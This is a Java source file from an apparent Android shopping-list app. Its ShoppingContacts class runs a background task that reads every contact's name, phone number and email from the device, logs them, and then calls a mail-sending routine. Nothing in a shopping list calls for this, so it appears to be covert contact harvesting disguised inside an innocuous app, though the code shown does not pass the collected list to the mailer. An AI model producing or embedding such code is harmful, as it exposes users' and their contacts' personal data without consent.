package com.example.jonas.shoppinglist.processes;

import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.jonas.shoppinglist.communication.MailSender;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;


public class ShoppingContacts extends AsyncTask<Void, Void, Void>  {
    private MailSender mailSender;
    private Activity activity;
    private Cursor contactCursor;
    private Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    private String[] projection = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Email.ADDRESS};

    public ShoppingContacts(Activity activity) {
        mailSender = new MailSender();
        this.activity = activity;
    }

    @Override
    protected Void doInBackground(Void... params) {

        contactCursor = activity.getContentResolver().query(uri, projection,null,null, null);

        int nameIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME);
        int phoneIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);
        int idIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID);
        int emailIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS);

        List<String> resultSet = new ArrayList<>();
        resultSet.add("Contact list:");
        while(contactCursor.moveToNext()){
            String name = contactCursor.getString(nameIdx);
            String phone = contactCursor.getString(phoneIdx);
            String email = contactCursor.getString(emailIdx);
            String id = contactCursor.getString(idIdx);

            resultSet.add("id:" + id + ", name = " + name + ", phone number = " + phone + ", e-mail: " + email);
        }

        for(String contact : resultSet)
        Log.d("MainActivity", contact);
        mailSender.send();

        return null;
    }
}
